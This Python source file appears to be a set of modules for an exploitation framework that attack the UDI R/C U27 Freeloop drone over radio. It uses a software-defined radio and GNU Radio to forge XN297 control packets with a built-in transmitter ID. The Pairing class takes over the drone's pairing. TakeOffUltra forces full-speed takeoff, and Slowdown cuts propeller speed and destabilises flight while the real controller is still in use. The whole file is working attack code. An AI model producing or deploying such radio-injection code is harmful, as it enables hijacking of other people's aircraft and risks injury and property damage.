# -*- coding: UTF-8 -*-
__copyright__ = "E. Borel"
__license__ = "agpl-3.0"
__doc__ = """
Module for UDIR/C U27 Freeloop
"""
from sploitkit import *
from lib.radio.SDRModule import SDRXN297Module, SDRModule
import binascii
import time
from gnuradio import blocks
from gnuradio import digital
from gnuradio import gr
import osmosdr


class U27FreeloopModule(SDRXN297Module):
	"""
	Proxy class defining high-level attributes and methods for each command
	"""
	def __init__(self):
		super(U27FreeloopModule, self).__init__()
		self.config[SDRModule.FREQUENCY] = "2.47e9"
		self.config[SDRModule.SAMP_SYMS] = 8
		self.config[SDRXN297Module.TXID] = "c3 d0 20 e1"
		self.config[SDRXN297Module.SEED] = 27573
	def init(self):
		"""
		There is a shift between the classical preamble and the one used by the drone
		Then the TX id found by the scanner shoud be also shifted
		"""
		super().init()
		self.preamble = [7, 16, 245]
		x = [self.preamble[-1]] + self.TXid
		for i in range(len(x)-1):
			self.TXid[i] = ((x[i] << 4) | (x[i+1] >> 4)) & 0xff

class Pairing(U27FreeloopModule):
	"""
	Module used to make the pairing between the drone and the transceiver
	"""
	path = "command/udirc/u27freeloop"

	def __init__(self):
		super(Pairing, self).__init__()

	def run(self):
		"""
		Establish the connection with the drone (unecessary if genuine controller already turned-on)
		"""
		self.init()
		if self.osmosdr_sink == None:
			return
		container = gr.top_block()
		gmsk_mod0 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
		gmsk_mod1 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
		vec_src0 = blocks.vector_source_c((self.silent,), True, 1, [])
		payload, size1 = self.build_payload([28, 42, 198, 234, 96, 94, 248, 208, 145, 54, 147])
		vec_src1 = blocks.vector_source_b(payload, True, 1, [])
		payload, size2 = self.build_payload([28, 42, 222, 234, 96, 94, 248, 208, 145, 54, 146])
		vec_src2 = blocks.vector_source_b(payload, True, 1, [])
		mux = blocks.stream_mux(gr.sizeof_gr_complex*1, (size1, size1 * 5, size2))
		container.connect((mux, 0), (self.osmosdr_sink, 0))
		container.connect((vec_src2, 0), (gmsk_mod0, 0))
		container.connect((vec_src1, 0), (gmsk_mod1, 0))
		container.connect((vec_src0, 0), (mux, 1))
		container.connect((gmsk_mod1, 0), (mux, 0))
		container.connect((gmsk_mod0, 0), (mux, 2))
		container.start()
		time.sleep(3)
		container.stop()
		container.wait()
		self.osmosdr_sink.disconnect_all()


class TakeOffUltra(U27FreeloopModule):
	"""
	Module making the propellers turn really fast
	"""
	path = "command/udirc/u27freeloop"

	def __init__(self):
		super(TakeOffUltra, self).__init__()

	def run(self):
		"""
		Be cautious, the drone takes off at the highest speed.
		"""
		self.init()
		if self.osmosdr_sink == None:
			return
		container = gr.top_block()
		gmsk_mod0 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
		gmsk_mod1 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
		silent = blocks.vector_source_c((self.silent,), True, 1, [])
		payload, size1 = self.build_payload([28, 42, 0xce, 0xea, 0xF8, 94, 248, 208, 145, 54, 0x93])
		vec_src0 = blocks.vector_source_b(payload, True, 1, [])
		payload, size2 = self.build_payload([28, 42, 220, 235, 96, 218, 232, 200, 129, 38, 157])
		vec_src1 = blocks.vector_source_b(payload, True, 1, [])
		mux = blocks.stream_mux(gr.sizeof_gr_complex*1, (size1, size1 * 5, size2))
		container.connect((mux, 0), (self.osmosdr_sink, 0))
		container.connect((vec_src1, 0), (gmsk_mod0, 0))
		container.connect((vec_src0, 0), (gmsk_mod1, 0))
		container.connect((silent, 0), (mux, 1))
		container.connect((gmsk_mod1, 0), (mux, 0))
		container.connect((gmsk_mod0, 0), (mux, 2))
		container.start()
		self.wait_for_exit()
		container.stop()
		container.wait()
		self.osmosdr_sink.disconnect_all()

class Slowdown(U27FreeloopModule):
	"""
	Module slowing down the propellers, then mqking the flight really unstable if the power of the controller and tthe transciever are both strong.
	"""
	path = "command/udirc/u27freeloop"

	def __init__(self):
		super(Slowdown, self).__init__()

	def run(self):
		"""
		Makes the propellers spin at the lowest speed (no move)
		"""
		self.init()
		if self.osmosdr_sink == None:
			return
		container = gr.top_block()
		gmsk_mod0 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
		gmsk_mod1 = digital.gmsk_mod(samples_per_symbol=self.samp_syms,bt=1,verbose=False,log=False,)
		silent = blocks.vector_source_c((self.silent,), True, 1, [])
		payload, size1 = self.build_payload([28, 42, 0xde, 0xea, 0x60, 94, 248, 208, 145, 54, 0x92])
		vec_src0 = blocks.vector_source_b(payload, True, 1, [])
		payload, size2 = self.build_payload([28, 42, 220, 235, 96, 218, 232, 200, 129, 38, 157])
		vec_src1 = blocks.vector_source_b(payload, True, 1, [])
		mux = blocks.stream_mux(gr.sizeof_gr_complex*1, (size1, size1 * 5, size2))
		container.connect((mux, 0), (self.osmosdr_sink, 0))
		container.connect((vec_src1, 0), (gmsk_mod0, 0))
		container.connect((vec_src0, 0), (gmsk_mod1, 0))
		container.connect((silent, 0), (mux, 1))
		container.connect((gmsk_mod1, 0), (mux, 0))
		container.connect((gmsk_mod0, 0), (mux, 2))
		container.start()
		self.wait_for_exit()
		container.stop()
		container.wait()
		self.osmosdr_sink.disconnect_all()

